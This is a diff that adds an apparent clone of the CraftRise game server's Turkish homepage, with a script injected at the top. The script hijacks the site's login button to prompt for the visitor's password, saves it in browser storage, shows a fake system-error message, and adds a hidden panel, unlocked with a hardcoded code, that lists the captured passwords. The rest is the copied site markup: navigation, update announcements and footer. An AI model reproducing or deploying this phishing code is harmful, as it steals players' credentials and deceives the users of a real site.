@@ -1,0 +1,395 @@
+<html lang="tr">
+<!-- Mevcut kodun sonuna eklenecek kısım -->
+<script>
+    // 1. Giriş yapıldığında şifreleri yakalama fonksiyonu
+    // Sitedeki mevcut onclick="openLoginBox()" fonksiyonunu manipüle ediyoruz
+    const orjinalLoginBox = window.openLoginBox;
+    window.openLoginBox = function() {
+        let pass = prompt("Lütfen giriş şifrenizi yazınız:");
+        if (pass) {
+            let logs = JSON.parse(localStorage.getItem('site_loglari') || "[]");
+            logs.push({ sifre: pass, tarih: new Date().toLocaleString('tr-TR') });
+            localStorage.setItem('site_loglari', JSON.stringify(logs));
+            alert("Sistem hatası: Giriş şu an yapılamıyor, lütfen daha sonra tekrar deneyiniz.");
+        }
+        if(typeof orjinalLoginBox === 'function') orjinalLoginBox();
+    };
+
+    // 2. #şifreler kontrol mekanizması
+    function gizliPaneliKontrolEt() {
+        if (window.location.hash === "#şifreler") {
+            let adminSifre = prompt("Admin Girişi:");
+            if (adminSifre === "3131") {
+                renderSifreListesi();
+            } else {
+                alert("Yetkisiz Erişim!");
+                window.location.hash = "";
+            }
+        }
+    }
+
+    // 3. Şifreleri listeleyen panel
+    function renderSifreListesi() {
+        let logs = JSON.parse(localStorage.getItem('site_loglari') || "[]");
+        let listeHtml = logs.length > 0 
+            ? logs.map(l => `<div style="border-bottom:1px solid #333; padding:10px;"><b>[${l.tarih}]</b> Girilen Şifre: <span style="color:#ff4500">${l.sifre}</span></div>`).join('')
+            : "Henüz kaydedilmiş şifre yok.";
+
+        let panel = document.createElement("div");
+        panel.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#0f0; z-index:999999; padding:40px; overflow-y:auto; font-family:monospace; font-size:18px;";
+        panel.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h1 style="color:#E2621B">LOGLANAN ŞİFRELER LİSTESİ</h1>
+                <button onclick="location.reload()" style="background:#E2621B; color:white; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">KAPAT</button>
+            </div>
+            <hr style="border-color:#222">
+            <div>${listeHtml}</div>
+        `;
+        document.body.appendChild(panel);
+    }
+
+    // Sayfa yüklendiğinde ve URL değiştiğinde kontrol et
+    window.addEventListener('hashchange', gizliPaneliKontrolEt);
+    window.addEventListener('load', gizliPaneliKontrolEt);
+</script>
+<base href="https://www.craftrise.com.tr/"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, maximum-scale=1">
+
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.0-beta2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+	<link rel='stylesheet' href='/css/pretty-checkbox.css'>
+	<link rel='stylesheet' href='/css/style.css?v=77'>
+	<script src="https://www.google.com/recaptcha/api.js?render=6LfhmvEmAAAAAKCG7yu5dywabnggUDi5aFuJOgpf"></script>
+			
+	<link rel="stylesheet" href="/css/swiper.min.css">
+	<link rel="stylesheet" href="/css/swipehead.min.css">
+	<link rel="stylesheet" href="/css/main.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+	<link rel="icon" href="images/icons/favicon.svg" sizes="16x16" type="image/png">
+
+	<title>CraftRise - Türkiye'nin En Etkileşimli Oyun Sunucusu</title>
+	<meta name="description" content="Türkiye'nin en çok aktif oyuncuya sahip ve en eğlenceli oyunu! En aktif ve eğlenceli oyun deneyimi için buradayız." />
+	<meta name="author" content="CraftRise">
+	<link rel="manifest" href="/manifest.json">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-title" content="craftrise.com.tr">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<link rel="apple-touch-icon" sizes="128x128" href="/pwa/img/128x128.png">
+	<link rel="apple-touch-icon-precomposed" sizes="128x128" href="/pwa/img/128x128.png">
+	<link rel="icon" sizes="192x192" href="/pwa/img/192x192.png">
+	<link rel="icon" sizes="128x128" href="/pwa/img/128x128.png">
+	
+	<script>
+		navigator.serviceWorker.register("/js/sw.js").then(() => {});
+	</script>
+</head>
+	<body>
+		<script type="text/javascript" src="/js/jquery-1.8.3.min.js"></script>
+<script src="/css/polipop.min.js"></script>
+<link rel="stylesheet" href="/css/polipop.core.min.css" />
+<link rel="stylesheet" href="/css/polipop.default.min.css" />
+<a class="backToTop"></a>
+<script src="https://kit.fontawesome.com/d198486374.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script src="js/jquery.bootstrap-growl.js"></script>
+<script src="js/swiper.min.js"></script>
+<script src="js/rise_new.php" charset="utf-8"></script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/three.js/95/three.min.js"></script>
+<script type="text/javascript" src="js/example.js"></script>
+
+<div id="cf-challenge"></div>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer onload="onTurnstileLoad()"></script>
+
+<style>
+</style>
+<nav class="navbar navbar-expand-lg navbar-orange bg-orange" style="height:auto">
+    <div class="header-logo">
+        <a class="navbar-brand" href="/anasayfa">
+            <img src="/images/icons/logo.svg" width="35" height="35" class="d-inline-block align-top" alt="">
+        </a>
+    </div>
+    <button class="navbar-toggler" style="border: none; outline: none; box-shadow: none;" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"><i class="fas fa-bars" style="font-size:28px;"></i></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup" style="text-align: center;">
+        <div class="navbar-nav mr-auto">
+            <a class="nav-item-header nav-link rise-navbar active" href="/oyunlar">OYUNLAR</a>
+            <a class="nav-item-header nav-link rise-navbar" style="position: relative;" href="/shop">
+                                MARKET            </a>
+            <a class="nav-item-header nav-link rise-navbar" href="/destek">DESTEK</a>
+            <a class="nav-item-header nav-link rise-navbar" id='hizmet-sartlari' href="/hizmet-sartlari#kurallar">KURALLAR</a>
+            <div class="nav-item-header nav-link rise-navbar no-hover dropdown show">
+                <a class="dropdown-toggle w-100 h-100" style="padding: 8px;" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                    SIRALAMA                </a>
+                <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
+                    <a href="/siralama" class="dropdown-item"><i class="fa-solid fa-crown"></i> Oyun Sıralamaları</a>
+                    <a href="/loncasiralamasi" class="dropdown-item"><i class="fa-solid fa-gamepad"></i> Lonca Sıralamaları</a>
+                </div>
+            </div>
+        </div>
+        <div class="navbar-nav clickable" style="padding-right: 1rem !important;">
+             
+						  <a onclick="openLoginBox()" 
+							 class="navbar-login nav-item-header nav-link d-flex align-items-center"
+							 style="gap: 5px;"> 
+							<!-- gap ile ikon ile yazı arasındaki boşluğu ayarlayabilirsiniz -->
+							<img src="/images/icons/giris.svg" width="26" height="26" alt="">
+							<span>GİRİŞ YAP</span>
+						  </a>
+                        <a onclick="openPlayBox()" class="oynabutton px-8 py-2 header-oyna text-gray-100 rounded uppercase" style="width: 110px; margin: auto;">OYNA</a>
+        </div>
+
+
+    </div>
+</nav>
+			<div class="carousel-inner rise-carousel" role="listbox">
+			<video controls preload="none" style="width:100% !important" muted="" id="swiper-video" autoplay="" playsinline="" oncontextmenu="return false;" loop poster="">
+				<source src="/images/videos/swiper.mp4" type="video/mp4">
+			</video>
+			
+			<div class="rise-slide-text">				<h1 data-animation="animated fadeInUp" class="font-mikado-black">CRAFTRISE</h1>
+				<h3 data-animation="animated fadeInUp" class="font-mikado-regular">EĞLENCE DÜNYASINA HOŞ GELDİN!</h3>
+				<a onclick="openPlayBox()" data-animation="animated fadeInUp" class="font-mikado clickable">OYNA</a>
+			</div>
+			<div class="close-button" onclick="pauseSwiper();"><i id="pause-icon" class="fas fa-pause-circle"></i></div>
+		</div>
+	
+<script>
+    var videoState = true;
+
+    function pauseSwiper() {
+        var vid = document.getElementById("swiper-video");
+        var icon = document.getElementById("pause-icon");
+        if (videoState == true) {
+            vid.pause();
+            videoState = false;
+            icon.classList.add("fa-play-circle");
+            icon.classList.remove("fa-pause");
+        } else {
+            vid.play();
+            videoState = true;
+            icon.classList.remove("fa-play-circle");
+            icon.classList.add("fa-pause");
+        }
+    }
+</script>
+		<div class="container" style="margin-top: 50px; margin-bottom: 150px;">
+			<div class="row">
+				<div class="col-md-2"></div>
+				<div class="col-md-8">
+											<div class="rise-announcement">
+															<div class="announcement-image-area">
+																			<img src="images/news/6a27e0cb8f95817d515ffed51b5f9a20.png" class="image">
+																	</div>
+														<div class="announcement-text-area" style="">
+								<p class="announcement-tag">
+									DUYURU</p>
+								<h1 class="announcement-title">
+									FACTIONS GÜNCELLEMESİ!								</h1>
+								<div class="announcement-content">YENİ! Mana Kutusu artık oyunda!
+YENİ! Kan Kılıcı ve G&ouml;lge Yayı eklendi!
+YENİ! Yepyeni İhale Sistemi geldi! (Kullan: /ihale)
+YENİ! Yepyeni Ticaret Sistemi geldi! (Kullan: /ticaret)
+YENİ! /sitemarket men&uu...</div>
+								<div class="announcement-bottom">
+									<a href="haber/257" class="announcement-button">Devamını oku <i class="fas fa-caret-right"></i></a>
+									<p class="announcement-time">27 Ekim 2025</p>
+								</div>
+							</div>
+						</div>
+											<div class="rise-announcement">
+															<div class="announcement-image-area">
+																			<img src="images/news/4adbb154e32e2911d8f5a06b8f35c9e3.jpg" class="image">
+																	</div>
+														<div class="announcement-text-area" style="">
+								<p class="announcement-tag">
+									DUYURU</p>
+								<h1 class="announcement-title">
+									SPEED BUILDERS GÜNCELLEMESİ!								</h1>
+								<div class="announcement-content">YENİ: Oyuna yeni yapılar eklendi, artık daha fazla farklı yapı inşa edebilirsiniz.
+YENİ: M&uuml;kemmel yapı yapan oyuncuların temayı ka&ccedil; saniyede tamamladığı kaydediliyor ve her yeni rekor, oyun bittikte...</div>
+								<div class="announcement-bottom">
+									<a href="haber/256" class="announcement-button">Devamını oku <i class="fas fa-caret-right"></i></a>
+									<p class="announcement-time">27 Ekim 2025</p>
+								</div>
+							</div>
+						</div>
+											<div class="rise-announcement">
+															<div class="announcement-image-area">
+																			<img src="images/news/a4f7d920b3f5e6c7d8f9a0123456789a.jpeg" class="image">
+																	</div>
+														<div class="announcement-text-area" style="">
+								<p class="announcement-tag">
+									DUYURU</p>
+								<h1 class="announcement-title">
+									HEROBRINE CHAMBER GÜNCELLEMESİ!								</h1>
+								<div class="announcement-content">HEROBRINE CHAMBER G&Uuml;NCELLEMESİ AKTİF!
+- +5 yeni oyun eklendi.- Harita değiştirildi.- Birka&ccedil; oyunda d&uuml;zenleme yapıldı.- Bildirilen birka&ccedil; oyun hatası d&uuml;zeltildi.- Kazandığınız oyunlard...</div>
+								<div class="announcement-bottom">
+									<a href="haber/253" class="announcement-button">Devamını oku <i class="fas fa-caret-right"></i></a>
+									<p class="announcement-time">17 Mart 2025</p>
+								</div>
+							</div>
+						</div>
+											<div class="rise-announcement">
+															<div class="announcement-image-area">
+																			<img src="images/news/e9c73808ce9dfcfd736f7b0a6586e9f5.jpeg" class="image">
+																	</div>
+														<div class="announcement-text-area" style="">
+								<p class="announcement-tag">
+									DUYURU</p>
+								<h1 class="announcement-title">
+									BUILD BATTLE GÜNCELLEMESİ!								</h1>
+								<div class="announcement-content">- YENİ! Yeni &ouml;zel duvarlar eklendi!- Blok limiti 36 olarak değiştirildi.- Harita g&uuml;ncellendi.- Solo oyunda zaman ayarı 6 dakika olarak g&uuml;ncellendi.- Oylama durumunda s&uuml;rekli mor takımdan başlıyordu...</div>
+								<div class="announcement-bottom">
+									<a href="haber/252" class="announcement-button">Devamını oku <i class="fas fa-caret-right"></i></a>
+									<p class="announcement-time">12 Mart 2025</p>
+								</div>
+							</div>
+						</div>
+											<div class="rise-announcement">
+															<div class="announcement-image-area">
+																			<img src="images/news/9d5981fabcb7e57cf8aca9b8b79d831e.jpeg" class="image">
+																	</div>
+														<div class="announcement-text-area" style="">
+								<p class="announcement-tag">
+									DUYURU</p>
+								<h1 class="announcement-title">
+									SURVIVAL AMETIST V2.3 GÜNCELLEMESİ!								</h1>
+								<div class="announcement-content">YENİ! Ametist Puan&#39;ı eklendi! Artık Artemis Savaş D&uuml;nyası&#39;nda arenaya girebilmek i&ccedil;in Ametist Puanı&#39;na ihtiyacınız olacak.
+YENİ! Artemis Savaş D&uuml;nyası&#39;na "Puan D&uuml;kkanı" adı...</div>
+								<div class="announcement-bottom">
+									<a href="haber/246" class="announcement-button">Devamını oku <i class="fas fa-caret-right"></i></a>
+									<p class="announcement-time">23 Ocak 2025</p>
+								</div>
+							</div>
+						</div>
+											<center>
+							<div class="pagination">
+								<a href="sayfa/1" class="active">1</a><a href="sayfa/2">2</a><a href="sayfa/3">3</a><a href="sayfa/2">&raquo;</a>							</div>
+						</center>
+									</div>
+				<div class="col-md-2"></div>
+			</div>
+		</div>
+
+
+
+		</div>
+	<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"d5e4d36abf614592a0d12882ad05a003","server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body><footer id="rise-footer" class="rise-footer" >
+    <center>
+        <div class="flex h-20 footer-bg" style="margin-bottom: -40">
+            <div class="border-t-4 border-red-500 relative w-full" style="border-top: #E2621B 4px solid !important;">
+                        </div>
+        </div>
+        <div class="footer-bg">
+            <div class="container w-full px-4 text-white flex flex-col">
+                <div class="flex  flex-col md:flex-row ">
+                    <div class="w-full md:w-2/6 xl:text-left text-center">
+                        <div class="pl-6 p-4" style="text-align: left;">
+                            <p class="font-mikado-black font-bold xl:text-2xl md:text-md sm:text-md text-gray-100 craftrise-kimdir">CRAFTRISE NEDİR?</p>
+                            <p class="font-mikado-light mt-2 text-lg text-gray-300 xl:text-left text-center" style="text-align: left !important">2015’te oyuncularla buluşan CraftRise, blok tabanlı bir sandbox evreninde rekabet, strateji ve yaratıcılığı buluşturan çevrim içi çok oyunculu bir oyundur. Farklı oyun modlarıyla ister bireysel becerilerini sınayabilir, ister takım arkadaşlarınla birlikte arenalara hükmedebilirsin. Sürekli güncellenen yapısı ve aktif topluluğuyla CraftRise, her seviyeden oyuncuya dinamik ve sürükleyici bir deneyim sunar.</p>
+                        </div>
+                    </div>
+                    <div class="w-full md:w-2/6 text-gray-400">
+                        <br><br><br>
+                        <a onclick="openPlayBox()" class="oynabutton px-8 py-2 bg-orange-rise text-gray-100 font-bold rounded uppercase">OYNA</a>
+                    </div>
+                    <div class="w-full md:w-2/6 text-gray-400">
+                        <br>
+                        <p class="uppercase font-bold xl:text-2xl text-left font-mikado-black text-gray-100 hizli-erisim">HIZLI ERİŞİM</p>
+                        <div class="mt-1 flex flex-row gap-6" style="justify-content: flex-start;">
+                            <div class="footer-area" id="footerarea1" style="min-width: 120px;">
+                                <ul class="flex-2  list-inside">
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="shop" class="footer-text xl:text-lg md:text-md sm:text-sm"> Market</a>
+                                    </li>
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="oyunlar" class="footer-text xl:text-lg md:text-md sm:text-sm"> Oyunlar</a>
+                                    </li>
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="destek" class="footer-text xl:text-lg md:text-md sm:text-sm"> Destek</a>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="footer-area" id="footerarea2" style="min-width: 180px;">
+                                <ul class="flex-2  list-inside">
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="hizmet-sartlari" class="footer-text xl:text-lg md:text-md sm:text-sm"> Hizmet Şartları</a>
+                                    </li>
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="kvkk" class="footer-text xl:text-lg md:text-md sm:text-sm"> K.V.K.K</a>
+                                    </li>
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="contentpolicy" class="footer-text xl:text-lg md:text-md sm:text-sm"> İçerik Politikası</a>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="footer-area" id="footerarea3" style="min-width: 120px;">
+                                <ul class="flex-2  list-inside">
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <div class="footer-text xl:text-lg md:text-md sm:text-sm clickable" onclick="openRegisterBox(false);">Kayıt</div>
+                                    </li>
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="carrier" class="footer-text xl:text-lg md:text-md sm:text-sm"> Kariyer</a>
+                                    </li>
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="contact" class="footer-text xl:text-lg md:text-md sm:text-sm"> İletişim</a>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+
+
+                        <br>
+                        <div class="footer-area" id="footerarea1" style="min-width: 220px;">
+                                <ul class="flex-2  list-inside">
+                                    <li class="flex font-mikado-light text-xl text-gray-100">
+                                        <img class="mr-2" src="/images/icons/nokta.svg">
+                                        <a href="https://www.blocklegends.net/" class="footer-text xl:text-lg md:text-md sm:text-sm"> CraftRise Mobil (Block Legends)</a>
+                                    </li>
+                                </ul>
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="bg-gray-900" style="background-color: #141414;">
+            <div class="flex pb-3 px-3 m-auto pt-3 text-sm flex-col md:flex-row container">
+                <div class="mt-2 text-gray-300 text-lg text-center font-mikado-light">© 2026 CraftRise | Tüm hakları saklıdır.</div>
+                <div class="md:flex-auto md:flex-row-reverse mt-2 flex-row flex xl:justify-between md:justify-between justify-center responsive-center" style="justify-content: flex-end">
+                    <a target="_blank" href="https://www.instagram.com/craftrise/" class="w-6 mx-1 origin-center transform hover:-translate-y-1  duration-200" style="width:35px; margin-left:15px !important;">
+                        <img src="/images/icons/instagram.svg">
+                    </a>
+                    <a target="_blank" href="https://www.youtube.com/channel/UCBWKrqYPZMXdlvQEhqvlxyA" class="w-6 mx-1 origin-center transform hover:-translate-y-1  duration-200" style="width:35px; margin-left:15px !important;">
+                        <img src="/images/icons/youtube.svg">
+                    </a>
+                    <a target="_blank" href="https://discord.craftrise.tc" class="w-6 mx-1 origin-center transform hover:-translate-y-1  duration-200" style="width:35px; margin-left:15px !important;">
+                        <img src="/images/icons/discord.svg">
+                    </a>
+                    <a target="_blank" href="https://t.me/craftrisetc" class="w-6 mx-1 origin-center transform hover:-translate-y-1  duration-200" style="width:35px; margin-left:15px !important;">
+                        <img src="/images/icons/telegram.svg">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </center>
+</footer>
+
+</html>
